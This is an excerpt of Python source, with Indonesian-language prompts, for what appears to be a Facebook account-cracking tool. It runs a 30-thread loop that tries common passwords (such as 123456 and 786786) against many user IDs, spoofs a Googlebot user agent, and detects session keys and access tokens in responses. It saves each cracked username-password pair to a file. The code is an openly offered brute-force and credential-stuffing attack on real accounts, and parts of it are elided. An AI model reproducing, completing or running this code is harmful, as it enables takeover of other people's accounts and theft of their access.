...
os.system('xdg-open https://www.facebook.com/syach.01234567890?mibextid=9R9pXO')
...
class Main:
	def __init__(self):
		...
		os.system("clear")
		print(logo)
		print('\033[93;1m SELAMAT DATANG BROOT \033[0m')
		print("")
		print("%s[%s1%s]%s Crack Random Akun Fb Old Tahun 2008-11 %s[New]"%(G,G,R,Y,B))
	...
	def fbold(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s[-➤] Gunakan Sandi Ini Salin/Tempel dibawah      [-➤] %s786786,123456,1234567,123456789"%(G,Y))
				listpass = input("%s[-➤] Masukan Sandi :%s "%(G,Y))
				if len(listpass)<=4:
					exit("\n%s[-➤] Sandi Minimal 6 Karacter"%(B))
  ...
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		...
		sys.stdout.write(
			"\r\r%s[ALIFXYZ] %s/%s -➤ \033[0;97m CP-➤%s \033[0;97m OK-➤%s "%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r\033[0;93m[XYZ-CP]USERNAME :%sSANDI :%s\033[0;93m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r\033[92;1m[XYZ-OK]USERNAME :%sSANDI :%s\033[92;1m         "%(uid, pw))
